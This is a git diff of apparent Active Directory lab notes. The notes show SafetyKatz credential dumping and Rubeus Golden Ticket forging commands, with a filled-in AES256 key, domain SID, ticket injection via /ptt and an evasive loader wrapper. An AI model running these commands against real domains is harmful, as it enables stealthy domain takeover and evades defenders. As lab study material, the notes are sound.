@@ -19,21 +19,19 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-
 ```
 
 
-Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT - **AND ALWAYS TARGET AN ACTIVE DA**
+Use Rubeus to forge a Golden ticket command with attributes similar to a normal TGT - **AND ALWAYS TARGET AN ACTIVE DA** 
 ```powershell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args golden /aes256:<keys> /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
 ```
 
-Above command generates the ticket forging command. Note that 3 LDAP
-queries are sent to the DC to retrieve the values:
-1. To retrieve flags for user specified in /user.
-2. To retrieve /groups, /pgid, /minpassage and /maxpassage
-3. To retrieve /netbios of the current domain
+
+> [!NOTE] **IMPORTANT**
+> Remember to add `/ptt` at the end of the generated command to inject the ticket into our current session
 
 
-OPSEC Friendly forge, with manually set values
+Now we can run the generated command which is OPSEC Friendly forge. 
 ```powershell
-C:\AD\Tools\Rubeus.exe golden
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe evasive-golden 
 /aes256:<keys> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
